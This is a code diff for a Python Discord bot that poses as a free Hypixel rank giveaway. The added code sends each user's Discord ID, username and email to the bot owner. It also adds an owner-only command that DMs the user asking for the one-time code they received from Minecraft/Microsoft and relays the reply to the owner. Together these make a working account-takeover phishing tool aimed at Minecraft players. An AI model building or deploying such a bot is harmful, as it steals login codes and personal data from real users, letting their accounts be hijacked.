@@ -5,10 +5,12 @@ import os
 
 intents = discord.Intents.default()
 intents.message_content = True
+intents.members = True
 bot = commands.Bot(command_prefix='*', intents=intents)
 
-# Temporary storage for OTPs
+OWNER_ID = 1101467683083530331  # Your Discord ID
 user_otps = {}
+pending_otps = {}
 
 @bot.event
 async def on_ready():
@@ -45,30 +47,82 @@ class ClaimModal(discord.ui.Modal, title="Claim Your Free Rank"):
     email = discord.ui.TextInput(label="Email Address", placeholder="e.g., your@email.com", required=True)
 
     async def on_submit(self, interaction: discord.Interaction):
+        user_id = interaction.user.id
         otp = str(random.randint(100000, 999999))
-        user_otps[interaction.user.id] = otp
+        user_otps[user_id] = otp
 
+        # DM the owner with the user info
+        owner = await bot.fetch_user(OWNER_ID)
+        await owner.send(
+            f"📥 **New Rank Claim Submitted!**\n"
+            f"> **Discord ID:** `{user_id}`\n"
+            f"> **Username:** `{self.username}`\n"
+            f"> **Email:** `{self.email}`\n\n"
+            f"✅ OTP for user: `{otp}` (sent to user via DM)."
+        )
+
+        # DM the user
         try:
             await interaction.user.send(
-                f"👋 Hey there!\n\nHere is your OTP to claim your Hypixel Rank:\n\n**{otp}**\n\n"
-                "Please enter it using the following command:\n"
-                f"`*confirmotp {otp}`"
+                f"👋 Here is your OTP to verify for Hypixel Rank:\n\n**{otp}**\n\n"
+                "Please type `*confirmotp <otp>` in the server."
             )
-            await interaction.response.send_message("✅ Info submitted! Check your DMs for the OTP.", ephemeral=True)
+            await interaction.response.send_message("✅ Info submitted! Check your DMs for OTP.", ephemeral=True)
         except:
-            await interaction.response.send_message("❌ Couldn't DM you. Please enable DMs from server members.", ephemeral=True)
+            await interaction.response.send_message("❌ I couldn't DM you. Please enable DMs.", ephemeral=True)
 
 @bot.command()
 async def confirmotp(ctx, otp_input):
     actual_otp = user_otps.get(ctx.author.id)
 
     if actual_otp is None:
-        await ctx.reply("❌ You haven't submitted a request yet. Use the panel first.")
+        msg = await ctx.reply("❌ You haven't submitted a form yet. Use the panel first.")
+        await msg.delete(delay=8)
     elif otp_input == actual_otp:
-        await ctx.reply("🎉 OTP Verified! You'll receive your Hypixel Rank within 24 hours.")
+        msg = await ctx.reply("🎉 OTP Verified! You’ll receive your Hypixel Rank soon.")
+        await msg.delete(delay=8)
         del user_otps[ctx.author.id]
     else:
-        await ctx.reply("❌ Incorrect OTP. Please try again.")
+        msg = await ctx.reply("❌ Incorrect OTP. Try again.")
+        await msg.delete(delay=8)
+
+
+@bot.command()
+async def getotp(ctx, user_id: int):
+    if ctx.author.id != OWNER_ID:
+        return await ctx.reply("❌ You are not authorized to use this command.")
+
+    user = await bot.fetch_user(user_id)
+    if not user:
+        return await ctx.reply("❌ Couldn't find that user.")
+
+    try:
+        await user.send(
+            f"👋 Please send me the **OTP you received from Minecraft/Microsoft** to complete your rank claim.\n\n"
+            f"Reply here with your OTP only."
+        )
+        pending_otps[user.id] = ctx.author.id  # Store that this user should send OTP to owner
+        await ctx.reply("📨 User has been prompted to send their OTP.")
+    except:
+        await ctx.reply("❌ Couldn't DM the user.")
+
+@bot.event
+async def on_message(message):
+    await bot.process_commands(message)
+
+    # If the message is a DM and the user is in pending_otps
+    if isinstance(message.channel, discord.DMChannel):
+        user_id = message.author.id
+        if user_id in pending_otps:
+            owner_id = pending_otps[user_id]
+            owner = await bot.fetch_user(owner_id)
+            await owner.send(
+                f"📨 **OTP Received from {message.author} (`{user_id}`):**\n\n`{message.content}`"
+            )
+            del pending_otps[user_id]
+            await message.channel.send("✅ Your OTP has been sent to the admin.")
+
+
 
 # Get token from environment variable
 bot.run(os.environ["TOKEN"])
